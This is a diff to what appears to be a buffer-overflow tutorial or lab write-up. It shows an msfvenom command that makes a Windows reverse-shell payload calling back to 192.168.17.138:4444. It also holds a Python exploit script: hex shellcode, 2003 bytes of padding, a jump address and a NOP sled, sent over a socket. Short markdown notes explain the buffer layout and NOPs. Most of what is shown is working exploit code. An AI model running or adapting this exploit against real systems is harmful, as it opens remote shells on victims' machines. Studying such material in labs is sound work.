@@ -397,8 +397,7 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.17.138 LPORT=4444 EXITFUNC
 #!/usr/bin/python
 import sys, socket 
 
-overflow = (
-"\xda\xca\xba\x78\x3d\xf7\x86\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
+overflow = ("\xda\xca\xba\x78\x3d\xf7\x86\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
 "\x52\x83\xee\xfc\x31\x56\x13\x03\x2e\x2e\x15\x73\x32\xb8\x5b"
 "\x7c\xca\x39\x3c\xf4\x2f\x08\x7c\x62\x24\x3b\x4c\xe0\x68\xb0"
 "\x27\xa4\x98\x43\x45\x61\xaf\xe4\xe0\x57\x9e\xf5\x59\xab\x81"
@@ -423,11 +422,6 @@ overflow = (
 "\x51\x3b\xa8\xfd\xd1\xc9\x51\xfa\xca\xb8\x54\x46\x4d\x51\x25"
 "\xd7\x38\x55\x9a\xd8\x68")
 
-# 'A' * 2003			; buffer		
-# "\xaf\x11\x50\x62"	; Jump address		
-# "\x90" * 32			; NOPs sled	
-# overflow				; reverse shell code
-
 shell_code = 'A' * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 	+ overflow
 
 try:
@@ -441,6 +435,11 @@ except:
 	sys.exit()
 	
 ````
+
+>'A' * 2003				; buffer		
+>"\xaf\x11\x50\x62"		; Jump address		
+>"\x90" * 32			; NOPs sled	
+> overflow				; reverse shell code# 'A' * 2003
 
 >**Q: What is NOPs?** \
 >A: A little bit of padding in between jump address and actual shell code.
